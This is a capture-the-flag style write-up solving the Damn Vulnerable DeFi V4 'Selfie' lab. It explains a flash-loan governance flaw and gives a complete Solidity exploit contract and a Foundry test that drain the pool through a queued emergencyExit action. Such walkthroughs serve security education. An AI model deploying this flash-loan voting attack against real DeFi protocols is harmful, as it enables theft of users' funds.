# Selfie

A new lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.

What could go wrong, right ?

You start with no DVT tokens in balance, and the pool has 1.5 million at risk.

Rescue all funds from the pool and deposit them into the designated recovery account.


# Challenge overview

[officail site](https://www.damnvulnerabledefi.xyz/challenges/selfie)
I am trying to reduce fluffs and indirect stuffs as much as posible

Let’s dive

The Selfie challenge is the sixth level in the Damn Vulnerable DeFi V4 series. The goal is simple: Exploit the govenance rule and drain all the funds from the pool.

fig2: source code file
It has 3 contracts
1) `SelfiePool.sol`: (“Take flash loan from here and emergency exit is also here!”)
2) `SimpleGovernance.sol`: (“Perform changes in the governance after meeting the criteria to governance”)
3) `ISimpleGovernance.sol`: (“JInterface for `SimpleGovernance.sol`”)


When a person has more than 50% stake of the pool or not and if the person has the proposal gets approved.


The system is totally recked and centralized. Giving full power for a single person is the not considered practical in blockchain.


## Exploit Logic :
1) Take the flash loan for more all balance of the pool
2) Now you have more than 50% of the funds coz the pool isn’t checking the funds are your own or from the loan
3) Place the queue for the emergency action and send all the funds to recovery account
Okay time for POC (wait : Before watching this, I think you got idea how to exploit it . It would be better if you tried writng POC by yourself and if you can’t you are free to explore below)
```solidity
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
contract SelfieExploiter is IERC3156FlashBorrower{
    address recovery;
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableVotes token;
    uint actionId;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor( address _pool, address _governance, address _token, address _recovery) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableVotes(_token);
        recovery = _recovery;
    }

    function Attack() external {
        pool.flashLoan(this,  address(token), 1_500_000 ether, "");
    }

    function onFlashLoan(
        address _initiator,
        address /*token*/,
        uint256 _amount,
        uint256 _fee,
        bytes calldata /*data*/
    ) external returns (bytes32){
        require(msg.sender == address(pool), "SideAttacker : only pool can call");
        require(_initiator == address(this), "SideAttacker : Initiator is not self");

        // Time to delgate vote to ourselves so we can queue an action 
        token.delegate(address(this));
        uint _actionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", recovery)
        );

        actionId = _actionId;
        token.approve(address(pool), _amount+_fee);

        return CALLBACK_SUCCESS;
    }

    function executeProposal() external {
        governance.executeAction(actionId);
    }

}
```
Now execute the contract inside the function where you supposed to solve the lab.
```solidity
function test_selfie() public checkSolvedByPlayer {
        SelfieExploiter exploiter = new SelfieExploiter(
            address(pool),
            address(governance),
            address(token),
            recovery
        );

        exploiter.Attack();
        vm.warp(block.timestamp + 2 days);

        exploiter.executeProposal();
    }
```
Okay! this much

### If you found this write up useful give a star to the **[repo](https://github.com/0xscarfac3/damnvulnerabledefi-v4-solutions)** and don't forget to follow your buddy **[0xscarfac3](https://github.com/0xscarfac3)**



